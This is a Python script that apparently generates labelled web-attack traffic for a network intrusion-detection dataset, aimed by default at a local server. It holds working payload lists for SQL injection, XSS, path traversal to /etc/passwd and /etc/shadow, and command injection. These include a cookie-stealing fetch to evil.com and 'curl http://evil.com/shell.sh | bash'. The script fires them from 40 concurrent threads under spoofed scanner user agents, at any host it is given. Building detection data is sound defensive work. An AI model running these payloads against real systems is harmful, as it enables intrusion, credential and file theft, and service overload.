#!/home/mayank/Desktop/DATACOLLECTION/venv/bin/python
"""
gen_web_attack.py — WEB_ATTACK (class 6/8) traffic generator
=============================================================
High-throughput concurrent version.

NFStream flow-level distinguishers vs BENIGN:
  - Very high request rate (concurrent automated attack)
  - Longer average URL bytes (injection payloads)
  - More consistent inter-arrival times (scripted, not human)
  - Repeated rapid requests to same few endpoints (scanning)
  - Higher bytes/flow (POST bodies with payloads)
  - dst_port = 8080 (consistent single target)

Usage:
    python3 attacks/gen_web_attack.py [--host 127.0.0.1] [--port 8080]
                                       [--duration 120] [--workers 40]
"""
import argparse
import json
import random
import time
import sys
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import threading

# ── Attack payloads ────────────────────────────────────────────────────────────
SQL_INJECTIONS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1 UNION SELECT username,password FROM users --",
    "' OR 1=1 --",
    "admin'--",
    "' HAVING 1=1 --",
    "1 AND 1=1",
    "1 OR 1=1",
    "' OR 'x'='x",
    "1; SELECT SLEEP(0)--",
    "' AND SUBSTRING(username,1,1)='a'--",
    "'; EXEC xp_cmdshell('id')--",
]
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "'><script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
]
PATH_TRAVERSALS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/files/../../../etc/hosts",
    "....//....//etc/passwd",
    "%252e%252e%252fetc%252fpasswd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
]
CMD_INJECTIONS = [
    "; ls -la /",
    "| cat /etc/passwd",
    "&& id",
    "; whoami",
    "$(id)",
    "`uname -a`",
    "; curl http://evil.com/shell.sh | bash",
]
AUTH_BYPASS = [
    "' OR 1=1--",
    "admin'--",
    "' OR '1'='1'--",
    '" OR "1"="1',
    "' OR 1=1#",
    "admin' #",
    "' OR 1=1/*",
]

# ── Request counters (thread-safe) ────────────────────────────────────────────
_lock = threading.Lock()
_count = 0

def _inc():
    global _count
    with _lock:
        _count += 1
        return _count


def req(url, method="GET", data=None, headers=None, timeout=3):
    """Fire a single HTTP request, swallow errors."""
    h = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "sqlmap/1.7.8#stable (https://sqlmap.org)",
            "Nikto/2.1.6",
            "python-requests/2.28.0",
        ])
    }
    if headers:
        h.update(headers)
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def attack_worker(base, stop_event):
    """
    Single worker thread: fires a random attack request in a loop until stopped.
    Each call = 1 new TCP connection = 1 NFStream flow.
    """
    while not stop_event.is_set():
        attack = random.randint(0, 4)
        try:
            if attack == 0:  # SQL Injection
                p = urllib.parse.quote(random.choice(SQL_INJECTIONS))
                endpoint = random.choice(["/search", "/api/data", "/login", "/api/users"])
                req(f"{base}{endpoint}?q={p}&id={random.randint(1,999)}")

            elif attack == 1:  # XSS
                p = urllib.parse.quote(random.choice(XSS_PAYLOADS))
                req(f"{base}/search?q={p}&page={random.randint(1,10)}")

            elif attack == 2:  # Path Traversal
                p = urllib.parse.quote(random.choice(PATH_TRAVERSALS))
                req(f"{base}/files/{p}")

            elif attack == 3:  # Command Injection via POST
                body = json.dumps({
                    "cmd": random.choice(CMD_INJECTIONS),
                    "input": f"test{random.randint(1,9999)}"
                }).encode()
                req(f"{base}/api/exec", method="POST", data=body,
                    headers={"Content-Type": "application/json"})

            else:  # Auth Bypass
                payload = random.choice(AUTH_BYPASS)
                body = json.dumps({
                    "username": payload,
                    "password": random.choice(AUTH_BYPASS),
                    "remember": True,
                }).encode()
                req(f"{base}/login", method="POST", data=body,
                    headers={"Content-Type": "application/json"})

        except Exception:
            pass

        n = _inc()
        if n % 1000 == 0:
            print(f"  [WEB] {n} requests fired...", flush=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host",     default="127.0.0.1")
    parser.add_argument("--port",     type=int, default=8080)
    parser.add_argument("--duration", type=int, default=120,
                        help="Seconds to run (default 120)")
    parser.add_argument("--workers",  type=int, default=40,
                        help="Concurrent attack threads (default 40)")
    args = parser.parse_args()

    base  = f"http://{args.host}:{args.port}"
    start = datetime.now()

    print("=" * 60)
    print("  WEB_ATTACK Traffic Generator (concurrent)")
    print(f"  Target  : {base}")
    print(f"  Duration: {args.duration}s")
    print(f"  Workers : {args.workers} concurrent attack threads")
    print(f"  Expected: ~{args.workers * args.duration * 3}+ flows")
    print("=" * 60)

    stop_event = threading.Event()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = [
            ex.submit(attack_worker, base, stop_event)
            for _ in range(args.workers)
        ]
        time.sleep(args.duration)
        stop_event.set()

    elapsed = (datetime.now() - start).total_seconds()
    print()
    print(f"[WEB] Done: {_count} requests in {elapsed:.1f}s  "
          f"({_count / max(elapsed, 1):.0f} req/s)")
    print(f"[WEB] Each request = 1 TCP flow → ~{_count} NFStream flows")


if __name__ == "__main__":
    main()
